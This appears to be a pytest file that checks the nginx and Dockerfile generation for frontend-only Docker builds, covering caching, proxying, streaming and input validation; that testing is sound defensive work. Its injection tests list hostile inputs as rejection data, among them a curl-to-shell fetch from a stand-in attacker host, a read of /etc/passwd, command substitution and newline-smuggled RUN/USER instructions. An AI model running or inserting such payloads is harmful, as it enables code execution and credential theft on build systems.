"""
Unit tests for the nginx config generated for Frontend-Only Docker builds.
Source: app/services/docker_worker

The config is assembled as shell-quoted arguments and only ever executed
inside a container, so mistakes surface as a runtime 404, a dropped WebSocket,
or a silently wrong cache policy — never as an exception here. These tests
assert the generated text directly.
"""

import pytest
from pydantic import ValidationError

from app.schemas.task import BuildConfig, ProjectType
from app.services.docker_worker import _generate_dockerfile, _validate_nginx_value


def _frontend_dockerfile(**overrides) -> str:
    config = BuildConfig(
        project_type=ProjectType.FRONTEND_ONLY,
        docker_expose_port=8080,
        **overrides,
    )
    return _generate_dockerfile(config)


class TestSpaAndCaching:
    """Static-serving behaviour — the whole point of the image."""

    @pytest.mark.unit
    def test_tc_ngx_001_spa_fallback_present(self):
        """TC-NGX-001: nginx — deep links fall back to index.html.

        Without this, reloading on a client-side route 404s.
        """
        assert "try_files $uri $uri/ /index.html;" in _frontend_dockerfile()

    @pytest.mark.unit
    def test_tc_ngx_002_hashed_assets_cached_immutably(self):
        """TC-NGX-002: nginx — /assets/ is cached hard.

        Bundlers emit content-hashed filenames, so the bytes at a URL can never
        change; without this every visit re-validates every asset, which is most
        of the load time for a site that only serves static files.
        """
        df = _frontend_dockerfile()
        assert "location /assets/ {" in df
        assert "public, immutable" in df

    @pytest.mark.unit
    def test_tc_ngx_003_index_html_not_cached(self):
        """TC-NGX-003: nginx — index.html is explicitly no-cache.

        It is the file that names the new hashed assets. Cache it and a deploy
        ships files nobody's browser ever requests.
        """
        df = _frontend_dockerfile()
        assert "location = /index.html {" in df
        assert '"no-cache"' in df

    @pytest.mark.unit
    def test_tc_ngx_004_worker_processes_bounded(self):
        """TC-NGX-004: nginx — worker_processes is pinned, not 'auto'.

        'auto' spawns one worker per core; on the 128-core build host that is
        128 nginx workers for a static site.
        """
        assert "worker_processes 2;" in _frontend_dockerfile()

    @pytest.mark.unit
    def test_tc_ngx_005_config_validated_at_build_time(self):
        """TC-NGX-005: nginx — the image fails to build rather than crash-loop."""
        assert "RUN nginx -t" in _frontend_dockerfile()


class TestApiProxy:
    """Reverse-proxy block, only emitted when the user configures a target."""

    @pytest.mark.unit
    def test_tc_ngx_010_no_proxy_block_without_target(self):
        """TC-NGX-010: nginx — no proxy directives when no API target is set."""
        df = _frontend_dockerfile()
        assert "proxy_pass" not in df
        assert "connection_upgrade" not in df

    @pytest.mark.unit
    def test_tc_ngx_011_location_matches_the_path_segment(self):
        """TC-NGX-011: nginx — /api/ is matched as a segment, not a prefix.

        A bare `location /api` also captures /api-docs, /apiv2 and anything
        else that merely starts with those characters, silently proxying
        frontend routes to the backend.
        """
        df = _frontend_dockerfile(docker_api_proxy="http://backend:8000")
        assert "location ^~ /api/ {" in df
        assert "location /api {" not in df

    @pytest.mark.unit
    def test_tc_ngx_012_websocket_upgrade_is_conditional(self):
        """TC-NGX-012: nginx — Connection comes from a map, never hardcoded.

        Sending `Connection: upgrade` on every request breaks keepalive to the
        upstream and confuses backends that inspect the header.
        """
        df = _frontend_dockerfile(docker_api_proxy="http://backend:8000")
        assert "map $http_upgrade $connection_upgrade {" in df
        assert "proxy_set_header Connection $connection_upgrade;" in df
        assert 'proxy_set_header Connection "upgrade"' not in df

    @pytest.mark.unit
    def test_tc_ngx_013_empty_key_uses_double_quotes(self):
        """TC-NGX-013: nginx — the map's empty-string key survives shell quoting.

        Config lines are emitted as single-quoted shell arguments. A '' written
        inside one is swallowed by the shell's string concatenation, producing
        a map entry with no key at all — so it must be written "".
        """
        df = _frontend_dockerfile(docker_api_proxy="http://backend:8000")
        assert '""      close;' in df
        assert "''      close;" not in df

    @pytest.mark.unit
    def test_tc_ngx_014_connect_timeout_present(self):
        """TC-NGX-014: nginx — a dead backend fails fast instead of hanging.

        Without proxy_connect_timeout nginx waits out its 75s default and the
        page simply appears frozen.
        """
        assert "proxy_connect_timeout" in _frontend_dockerfile(
            docker_api_proxy="http://backend:8000"
        )

    @pytest.mark.unit
    def test_tc_ngx_015_read_timeout_is_configurable(self):
        """TC-NGX-015: nginx — the user's timeout reaches both read and send."""
        df = _frontend_dockerfile(
            docker_api_proxy="http://backend:8000", nginx_proxy_read_timeout="600s"
        )
        assert "proxy_read_timeout 600s;" in df
        assert "proxy_send_timeout 600s;" in df

    @pytest.mark.unit
    def test_tc_ngx_016_default_timeout_survives_a_silent_backend(self):
        """TC-NGX-016: nginx — the default is long enough for a single-shot AI call.

        proxy_read_timeout is an idle timer, so a speech-to-text or
        non-streaming LLM request — which returns nothing at all until it
        finishes — is exactly what it kills. Of 100 real builds with a proxy
        configured, 96 ran at nginx's 60s and only 4 had raised it: the four
        who hit the wall and diagnosed it.
        """
        df = _frontend_dockerfile(docker_api_proxy="http://backend:8000")
        assert "proxy_read_timeout 300s;" in df
        assert "proxy_read_timeout 60s;" not in df


class TestStreaming:
    """Buffering behaviour — what makes token-by-token output actually stream."""

    @pytest.mark.unit
    def test_tc_ngx_030_buffering_disabled_by_default(self):
        """TC-NGX-030: nginx — response buffering is off for the proxied API.

        With nginx's default buffering on, an SSE stream is collected in full
        before anything reaches the client: the LLM appears to hang and then
        dump its whole answer at once, which reads as a frontend bug.
        """
        df = _frontend_dockerfile(docker_api_proxy="http://backend:8000")
        assert "proxy_buffering off;" in df

    @pytest.mark.unit
    def test_tc_ngx_031_request_buffering_disabled_by_default(self):
        """TC-NGX-031: nginx — uploads reach the backend as they arrive.

        Otherwise nginx receives an entire audio file before the STT backend
        sees byte one, adding the upload time to every request.
        """
        assert "proxy_request_buffering off;" in _frontend_dockerfile(
            docker_api_proxy="http://backend:8000"
        )

    @pytest.mark.unit
    def test_tc_ngx_032_streaming_can_be_turned_off(self):
        """TC-NGX-032: nginx — buffering returns when streaming is disabled.

        Buffering is not free: with it off, a slow client holds an upstream
        connection for the whole transfer. An app with no streaming should be
        able to keep nginx's default.
        """
        df = _frontend_dockerfile(
            docker_api_proxy="http://backend:8000", nginx_streaming=False
        )
        assert "proxy_buffering off;" not in df
        assert "proxy_request_buffering off;" not in df

    @pytest.mark.unit
    def test_tc_ngx_033_streaming_directives_stay_inside_the_proxy_block(self):
        """TC-NGX-033: nginx — buffering is not disabled for static files.

        Turning it off globally would make nginx serve every asset through the
        slow path for no benefit.
        """
        df = _frontend_dockerfile(nginx_streaming=True)
        assert "proxy_buffering off;" not in df


class TestValueValidation:
    """User-supplied directive values are rejected before the build starts."""

    @pytest.mark.unit
    @pytest.mark.parametrize("value", ["120s", "50m", "0", "http://backend:8000"])
    def test_tc_ngx_020_accepts_ordinary_values(self, value):
        """TC-NGX-020: _validate_nginx_value — normal values pass through trimmed."""
        assert _validate_nginx_value(f"  {value} ", "field") == value

    @pytest.mark.unit
    @pytest.mark.parametrize(
        "value",
        [
            "60s; root /etc",      # directive injection
            "60s\nserver { }",     # newline
            "'quoted'",            # would close the shell string
            '"quoted"',
            "60s # comment",       # comments out the rest of the line
            "60s}",
        ],
    )
    def test_tc_ngx_021_rejects_config_breaking_values(self, value):
        """TC-NGX-021: _validate_nginx_value — anything that escapes one directive is refused.

        The alternative is an nginx syntax error surfacing minutes into a
        Docker build, with nothing pointing back at the form field.
        """
        with pytest.raises(ValueError, match="不允許的字元"):
            _validate_nginx_value(value, "nginx_proxy_read_timeout")

    @pytest.mark.unit
    def test_tc_ngx_022_error_names_the_field(self):
        """TC-NGX-022: _validate_nginx_value — the message says which input to fix."""
        with pytest.raises(ValueError, match="docker_api_proxy"):
            _validate_nginx_value("http://x;evil", "docker_api_proxy")


class TestDockerfileInjection:
    """User-controlled strings interpolated into the generated Dockerfile.

    The file already gates `docker_custom_commands` behind an allow-list, so
    the risk was understood; these fields reached the same place with no check.
    RUN is shell form, and the whole Dockerfile is assembled by f-string, so a
    newline is enough to append an entirely new instruction.
    """

    @pytest.mark.unit
    @pytest.mark.parametrize(
        "command",
        [
            "build; curl http://attacker/x | sh",
            "build && cat /etc/passwd",
            "build`whoami`",
            "build $(id)",
            "build | tee /tmp/x",
            "build\nRUN echo pwned",
        ],
    )
    def test_tc_inj_001_build_command_rejects_shell_metacharacters(self, command):
        """TC-INJ-001: BuildConfig — a build command cannot carry a shell payload.

        It lands in `RUN {tool} run {command}`, executed by the docker daemon
        during build.
        """
        with pytest.raises(ValidationError):
            BuildConfig(frontend_build_command=command)

    @pytest.mark.unit
    @pytest.mark.parametrize("command", ["build", "build:prod", "build-only", "dev.ci", "b1"])
    def test_tc_inj_002_ordinary_script_names_still_work(self, command):
        """TC-INJ-002: BuildConfig — real npm script names are unaffected.

        Guards the other direction: a validator that rejects `build:prod`
        would break existing tasks.
        """
        assert BuildConfig(frontend_build_command=command).frontend_build_command == command

    @pytest.mark.unit
    @pytest.mark.parametrize(
        "value",
        ["frontend\nUSER root\nRUN evil", "../../../etc", "/etc", "dist\rRUN evil"],
    )
    def test_tc_inj_003_frontend_paths_reject_newlines_and_traversal(self, value):
        """TC-INJ-003: BuildConfig — COPY arguments cannot start a new instruction.

        A newline ends the COPY line; `..` escapes the build context.
        """
        with pytest.raises(ValidationError):
            BuildConfig(frontend_dir=value)
        with pytest.raises(ValidationError):
            BuildConfig(frontend_output_dir=value)

    @pytest.mark.unit
    @pytest.mark.parametrize("value", ["frontend", "apps/web", "packages/ui", "dist", "build"])
    def test_tc_inj_004_ordinary_directories_still_work(self, value):
        """TC-INJ-004: BuildConfig — normal nested directories are unaffected."""
        assert BuildConfig(frontend_dir=value).frontend_dir == value

    @pytest.mark.unit
    def test_tc_inj_005_generated_dockerfile_has_no_injected_instructions(self):
        """TC-INJ-005: end to end — a rejected payload never reaches the Dockerfile.

        Asserting on the rendered output as well as the validator, since the
        two could drift apart.
        """
        with pytest.raises(ValidationError):
            BuildConfig(
                project_type=ProjectType.FRONTEND_ONLY,
                frontend_build_command="build; curl http://attacker/x | sh",
            )
